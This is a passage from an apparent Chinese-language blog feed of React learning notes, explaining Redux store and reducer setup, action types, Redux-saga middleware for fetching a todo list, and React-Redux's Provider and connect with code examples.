class="keyword">var</span> fun = <span class="keyword">function</span> (<span class="params">dispatch</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> action = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;fun&quot;</span>,</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;dispatch carry by a function inner&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">dispatch</span>(action)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = <span class="keyword">new</span> <span class="title class_">Store</span>();</span><br><span class="line"><span class="comment">// 向实例化的store对象中传入方法</span></span><br><span class="line">store.<span class="title function_">dispatch</span>(fun)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; type: &#x27;fun&#x27;, msg: &#x27;dispatch carry by a function inner&#x27; &#125;</span><br></pre></td></tr></table></figure><p>原理图解：</p><p><img src="http://img.cdn.esunr.xyz/markdown/a71efaafly1g24hqz4xkvj20dg0dkgmk.jpg" alt="a71efaafly1g24hqz4xkvj20dg0dkgmk.jpg"></p></li></ol></li></ol><h1 id="05-使用Redux-saga中间件使用入门"><a href="#05-使用Redux-saga中间件使用入门" class="headerlink" title="05.使用Redux-saga中间件使用入门"></a>05.使用Redux-saga中间件使用入门</h1><h2 id="初始化Redux-saga"><a href="#初始化Redux-saga" class="headerlink" title="初始化Redux-saga"></a>初始化Redux-saga</h2><ol><li><p>更改目录结构</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/store </span><br><span class="line">  reducer.js</span><br><span class="line">  actionCreator.js</span><br><span class="line">  actionTypes.js</span><br><span class="line">  index.js</span><br><span class="line"><span class="addition">+ saga.js</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>./store/index.js</code>导入Redux-saga中间件（同时保持与Redux DevTools的兼容）</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  import &#123; createStore, applyMiddleware, compose &#125; from &#x27;redux&#x27;</span><br><span class="line">  import reducer from &#x27;./reducer&#x27;</span><br><span class="line"><span class="addition">+ import createSagaMiddleware from &#x27;redux-saga&#x27;</span></span><br><span class="line"><span class="addition">+ import TodoSagas from &#x27;./saga.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+ const sagaMiddleware = createSagaMiddleware()</span></span><br><span class="line"></span><br><span class="line">  const composeEnhancers =</span><br><span class="line">    window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ?</span><br><span class="line">      window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__(&#123;</span><br><span class="line">      &#125;) : compose;</span><br><span class="line"></span><br><span class="line">  const enhancer = composeEnhancers(</span><br><span class="line"><span class="addition">+   applyMiddleware(sagaMiddleware)</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  const store = createStore(</span><br><span class="line">    reducer,</span><br><span class="line">    enhancer</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line"><span class="addition">+ sagaMiddleware.run(TodoSagas)</span></span><br><span class="line"></span><br><span class="line">  export default store;</span><br></pre></td></tr></table></figure></li><li><p>在<code>sagas.js</code>中创建一个初始化的Generator函数</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; takeEvery &#125; <span class="keyword">from</span> <span class="string">&#x27;redux-saga/effects&#x27;</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">mySaga</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> mySaga;</span><br></pre></td></tr></table></figure></li></ol><h2 id="在项目中使用Redux-saga"><a href="#在项目中使用Redux-saga" class="headerlink" title="在项目中使用Redux-saga"></a>在项目中使用Redux-saga</h2><p>我们还借用之前的例子，当TodoList项目在页面加载后，需要发出AJAX请求来获取已有的TODO列表项。</p><p>我们先来讲解一下Redux-saga的原理：它会检查Store派发给Reducer的每个action，如果这个action代表的操作是期望执行一个异步函数，那么Redux-saga就会捕获这action，拿到<code>sagas.js</code>文件的业务代码中处理，进行一系列的异步操作，最后再生成一个action，交付给Reducer。</p><p><img src="http://img.cdn.esunr.xyz/markdown/a71efaafly1g24leszo7yj20tu0e2q3v.jpg" alt="a71efaafly1g24leszo7yj20tu0e2q3v.jpg"></p><p>接下来进行一个列子的详细流程：</p><ol><li><p>在 <code>actionTypes.js</code> 中创建一个actionType并导出，提供一个action的类型名</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">GET_INIT_LIST</span> = <span class="string">&#x27;get_init_list&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>在 <code>actionCreator.js</code> 中创建 <code>getInitList</code> 方法并导出，提供一个生成action对象的方法</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getInitList</span> = (<span class="params"></span>) =&gt; (&#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="variable constant_">GET_INIT_LIST</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>在 <code>TodoList.js</code> 组件中调用 <code>getInitList</code> 方法生成一个action对象，提供给Redux-saga劫持</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ import &#123; getInitList &#125; from &#x27;./store/actionCreator&#x27;</span></span><br><span class="line">... ...</span><br><span class="line">componentDidMount() &#123;</span><br><span class="line"><span class="addition">+ const action = getInitList();</span></span><br><span class="line">  store.dispatch(action);</span><br><span class="line"><span class="deletion">- axios.get(&#x27;https://www.easy-mock.com/mock/5cb48651462c851178e00ed0/study/todoList&#x27;)</span></span><br><span class="line"><span class="deletion">-   .then(res =&gt; &#123;</span></span><br><span class="line"><span class="deletion">-     const data = res.data;</span></span><br><span class="line"><span class="deletion">-     const action = initListAction(data);</span></span><br><span class="line"><span class="deletion">-     store.dispatch(action);</span></span><br><span class="line"><span class="deletion">-   &#125;)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编写 <code>saga.js</code> 劫持 <code>type: &#39;get_init_list&#39;</code> 的action，并进行异步操作，最终返回一个新的action交付给Reducer。</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; takeEvery, put &#125; <span class="keyword">from</span> <span class="string">&#x27;redux-saga/effects&#x27;</span> <span class="comment">// 导入put方法</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">GET_INIT_LIST</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./actionTypes&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; initListAction &#125; <span class="keyword">from</span> <span class="string">&#x27;./actionCreator&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">getInitList</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">yield</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://www.easy-mock.com/mock/5cb48651462c851178e00ed0/study/todoList&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> action = <span class="title function_">initListAction</span>(res.<span class="property">data</span>);</span><br><span class="line">  <span class="keyword">yield</span> <span class="title function_">put</span>(action); <span class="comment">// Redux-saga使用put()方法来代替store.dispatch()方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">mySaga</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="title function_">takeEvery</span>(<span class="variable constant_">GET_INIT_LIST</span>, getInitList);  <span class="comment">// 如果action的type为GET_INIT_LIST，就劫持这个action，并执行getInitList()方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> mySaga;</span><br></pre></td></tr></table></figure></li></ol><h1 id="06-React-Redux的基本使用使用"><a href="#06-React-Redux的基本使用使用" class="headerlink" title="06.React-Redux的基本使用使用"></a>06.React-Redux的基本使用使用</h1><h2 id="基本作用"><a href="#基本作用" class="headerlink" title="基本作用"></a>基本作用</h2><p>React-Redux优化了组件中对store的调用方式，在传统的组件中，如果想要调用store则需要引入store并让store与当前组件的state做关联。而React-Redux，提供了一个 <code>&lt;Provider&gt;&lt;/Provider&gt;</code> 容器组件，可以将store作为容器组件的props传入组件，这样在 <code>&lt;Provider&gt;</code> 容器组件中的其他组件就可以获取store，而不需要重复调用。</p><p>使用React-Redux基本步骤为：</p><ol><li>在项目的index.js中（或其他组件中也可以）设置<code>&lt;Provider&gt;</code>容器</li><li>在<code>&lt;Provider&gt;</code>容器的组件代码中，设置store与该组件props的映射关系，以及映射相关的disoatch操作到组件props中。</li><li>连接组件与state</li></ol><h2 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h2><p>文件目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/src</span><br><span class="line">+- index.js</span><br><span class="line">+- TodoList.js</span><br><span class="line">+- store</span><br><span class="line">   +- index.js</span><br><span class="line">   +- reducer.js</span><br></pre></td></tr></table></figure><ol><li><p><code>index.js</code> 中引入store和react-redux，并设置<code>&lt;Provider&gt;</code>容器组件：</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// index.js</span><br><span class="line"></span><br><span class="line">  import React from &#x27;react&#x27;;</span><br><span class="line"><span class="addition">+ import ReactDOM from &#x27;react-dom&#x27;;</span></span><br><span class="line"><span class="addition">+ import store from &#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line">  import TodoList from &#x27;./06-3.React-Redux/TodoList&#x27;</span><br><span class="line"><span class="addition">+ import &#123; Provider &#125; from &#x27;react-redux&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+ const App = (</span></span><br><span class="line"><span class="addition">+   &lt;Provider store=&#123;store&#125;&gt;</span></span><br><span class="line">      &lt;TodoList&gt;&lt;/TodoList&gt;</span><br><span class="line"><span class="addition">+   &lt;/Provider&gt;</span></span><br><span class="line"><span class="addition">+ )</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">- ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;));</span></span><br><span class="line"><span class="addition">+ ReactDOM.render(App, document.getElementById(&#x27;root&#x27;));</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>TodoList.js</code>组件中配置关于store和dispatch方法的映射：</p><p> 首先要引入react-redux的connect方法，<code>connect()</code>方法用来建设映射关系，它包含两个参数，第一个参数为映射的state相关设置，第二个为映射的dispatch相关设置，设置好之后，就可以将store的数据和有关于dispatch的操作挂载到组件的props属性中。</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoList.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TodoList</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 映射store中的数据到组件中的props</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mapStateToProps</span> = (<span class="params">store</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// 把store中inputValue的值映射到组件的props中</span></span><br><span class="line">    <span class="attr">inputValue</span>: store.<span class="property">inputValue</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将有关于dispatch操作相关的方法传入props中</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mapDispatchToProps</span> = (<span class="params">dispatch</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="title function_">handelInputChange</span>(<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> action = &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;change_input_value&#x27;</span>,</span><br><span class="line">        <span class="attr">value</span>: e.<span class="property">target</span>.<span class="property">value</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">dispatch</span>(action)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 核心API：connect 如果不需要connect()中的某个参数，则填写为null</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">connect</span>(mapStateToProps, mapDispatchToProps)(<span class="title class_">TodoList</span>);</span><br></pre></td></tr></table></figure><p> 当我们在组件内部使用传入的store的值时，可以直接调用组件的props属性，如当我们要取出刚才挂载到props上的</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&#123;this.props.inputValue&#125;</span> <span class="attr">onChange</span>= <span class="string">&#123;this.props.handelInputChange&#125;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>reducer.js</code>中编写处理store数据的业务逻辑</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React基础教程 </tag>
            
            <tag> Redux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React学习笔记03：Redux入门</title>
      <link href="/2019/05/bc729d7a74a6.html"/>
      <url>/2019/05/bc729d7a74a6.html</url>
      
        <content type="html"><![CDATA[<h1 id="02-redux概念"><a href="#02-redux概念" class="headerlink" title="02.redux概念"></a>02.redux概念</h1><p><img src="http://ww1.sinaimg.cn/large/a71efaafly1g191kj6wkej20rj0icjxn.jpg" alt=""></p><p>图书馆模型：</p><ul><li>React Components：借书的用户</li><li>Action Creators：借书说的话（借哪本书）</li><li>Store：图书管理员</li><li>Reducers（减速器，还原剂 ）：记录本</li></ul><h1 id="03-使用AntDesign"><a href="#03-使用AntDesign" class="headerlink" title="03.使用AntDesign"></a>03.使用AntDesign</h1><blockquote><p>示例：./03.AntDesign-TodoList<br><a href="https://ant.design/docs/react/introduce-cn">https://ant.design/docs/react/introduce-cn</a></p></blockquote><h1 id="04-Redux的创建与使用"><a href="#04-Redux的创建与使用" class="headerlink" title="04.Redux的创建与使用"></a>04.Redux的创建与使用</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">├── index.js</span><br><span class="line">├── TodoList.js</span><br><span class="line">├── store</span><br><span class="line">|   ├── index.js</span><br><span class="line">|   ├── reducer.js</span><br><span class="line">|   ├── actionCreator.js</span><br><span class="line">└── └── actionTypes.js</span><br></pre></td></tr></table></figure><h2 id="安装Redux"><a href="#安装Redux" class="headerlink" title="安装Redux"></a>安装Redux</h2><blockquote><p>yarn add redux</p></blockquote><h2 id="创建Reducer和Store"><a href="#创建Reducer和Store" class="headerlink" title="创建Reducer和Store"></a>创建Reducer和Store</h2><p>在这一步中我们创建一个Reducer去生成一个存放数据的位置，再把Reducer交给Store。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .store/index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">&#x27;./reducer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="title function_">createStore</span>(reducer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> store;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ./store/reducer.js</span></span><br><span class="line"><span class="keyword">const</span> defaultState =&#123;</span><br><span class="line">  <span class="comment">// 在此初始化rudecuer中的数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state = defaultState, action) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> state;</span><br><span class="line">  <span class="comment">// state 存放数据（存放图书馆里所有书的信息）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在组件中使用Redux中保存的数据"><a href="#在组件中使用Redux中保存的数据" class="headerlink" title="在组件中使用Redux中保存的数据"></a>在组件中使用Redux中保存的数据</h2><ol><li>在组件中导入store文件的位置 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;../04.Redux/store.js&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>在组件中可以使用<code>store.getState()</code>获取数据 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将store中的数据绑定在state上</span></span><br><span class="line"><span class="title function_">constructor</span>(<span class="params">props</span>)&#123;     </span><br><span class="line">  <span class="variable language_">super</span>(props);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">state</span> = store.<span class="title function_">getState</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="05-Action和Reducer的编写"><a href="#05-Action和Reducer的编写" class="headerlink" title="05.Action和Reducer的编写"></a>05.Action和Reducer的编写</h1><h2 id="使用Redux-DevTools"><a href="#使用Redux-DevTools" class="headerlink" title="使用Redux DevTools"></a>使用Redux DevTools</h2><p>在创建store的文件下，添加一句代码</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const store = createStore(</span><br><span class="line">  reducer,</span><br><span class="line"><span class="addition">+ window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__()</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="组件中直接请求更改数据"><a href="#组件中直接请求更改数据" class="headerlink" title="组件中直接请求更改数据"></a>组件中直接请求更改数据</h2><h3 id="1-组件发送修改请求action"><a href="#1-组件发送修改请求action" class="headerlink" title="1.组件发送修改请求action"></a>1.组件发送修改请求action</h3><p>在组件中可以直接创建一个<code>action</code>来请求更改Store中的数据，但是这个<code>action</code>必须符合规范，之后组件可以通过调用<code>store.dispatch(action)</code>方法，把<code>action</code>传递给<code>Store</code> </p><p>拿TodoList项目来说，当用户在文本框内输入了文字，会触发<code>onChange</code>而调用<code>handleInputChange</code>方法，此时在方法中要向Store中发送一个修改请求，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleInputChange</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> action = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;change_input_value&#x27;</span>,</span><br><span class="line">    <span class="attr">value</span>: e.<span class="property">target</span>.<span class="property">value</span></span><br><span class="line">  &#125;</span><br><span class="line">  store.<span class="title function_">dispatch</span>(action)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Store转发请求给Reducer"><a href="#2-Store转发请求给Reducer" class="headerlink" title="2.Store转发请求给Reducer"></a>2.Store转发请求给Reducer</h3><p>Store接受到一个<code>action</code>后，会将 <strong>当前的数据（previousState）</strong> 和 <strong>操作指令（action）</strong> 转发给Reducer（这就是在<code>reducer.js</code>中，要接收的两个变量），这一步是自动执行的。</p><h3 id="3-Reducers处理数据"><a href="#3-Reducers处理数据" class="headerlink" title="3.Reducers处理数据"></a>3.Reducers处理数据</h3><p>Reducers接收到当前的数据（previousState）和操作的指令（action）后，会将它们对并且处理数据，之后将新的数据（newState）传回给Store。</p><p>如在TodoList示例中，在Reducers中设置一个<code>change_input_value</code>的判断方法，去设置数据的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ./store/reducer.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state = defaultState, action) =&gt; &#123;</span><br><span class="line">  <span class="comment">// state：store上一次存储的数据，action指的是用户传入的那句话</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(state, action);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 查看用户的指令是什么</span></span><br><span class="line">  <span class="keyword">if</span> (action.<span class="property">type</span> === <span class="string">&#x27;change_input_value&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 对previousState进行一次深拷贝</span></span><br><span class="line">    <span class="keyword">const</span> newState = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(state));</span><br><span class="line">    newState.<span class="property">inputValue</span> = action.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">return</span> newState;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在此要注意的是：reducer可以接收state，但是绝对不能修改state，必须对state进行深拷贝后再处理数据。</p></blockquote><h3 id="4-Store拿到Reducer的处理结果"><a href="#4-Store拿到Reducer的处理结果" class="headerlink" title="4.Store拿到Reducer的处理结果"></a>4.Store拿到Reducer的处理结果</h3><p>Store拿到Reducer的处理结果后，会将旧的数据替换为新的数据，这个阶段Store并未将数据交给组件，需要组件去自我感知数据发生了变化并自行更新界面。</p><h3 id="5-组件感知Store中数据变化"><a href="#5-组件感知Store中数据变化" class="headerlink" title="5.组件感知Store中数据变化"></a>5.组件感知Store中数据变化</h3><p>在组件中的<code>constror</code>中调用<code>store.subscribe()</code>设置一个事件订阅，它的参数为个方法函数，用来检查store中的数据（state）是否发生了变化，如果发生了变化，就会调用参数中传入的方法，从而更新组件state中的数据，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// 注意this绑定（在设置订阅前绑定this）</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">handleStoreChange</span> = <span class="variable language_">this</span>.<span class="property">handleStoreChange</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">  <span class="comment">// 订阅store的改变</span></span><br><span class="line">  store.<span class="title function_">subscribe</span>(<span class="variable language_">this</span>.<span class="property">handleStoreChange</span>)</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="title function_">handleStoreChange</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 组件感知到store数据变化后更新数据</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setState</span>(store.<span class="title function_">getState</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="06-ActionType的拆分"><a href="#06-ActionType的拆分" class="headerlink" title="06.ActionType的拆分"></a>06.ActionType的拆分</h1><p>在<code>./store</code>目录下创建actionTypes来存放action的命名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// actionTypes.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">CHANGE_INPUT_VALUE</span> = <span class="string">&#x27;change_input_value&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">ADD_TODO_ITEM</span> = <span class="string">&#x27;add_todo_item&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">DELETE_TODO_ITEM</span> = <span class="string">&#x27;delete_todo_item&#x27;</span>;</span><br></pre></td></tr></table></figure><p>之后将<code>actionTypes.js</code>中的变量分别导入<code>TodoList.js</code>和<code>ruducer.js</code>中，之后在定义<code>action</code>时，调用变量即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reducer.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">CHANGE_INPUT_VALUE</span>, <span class="variable constant_">ADD_TODO_ITEM</span>, <span class="variable constant_">DELETE_TODO_ITEM</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./actionTypes&#x27;</span></span><br></pre></td></tr></table></figure><h1 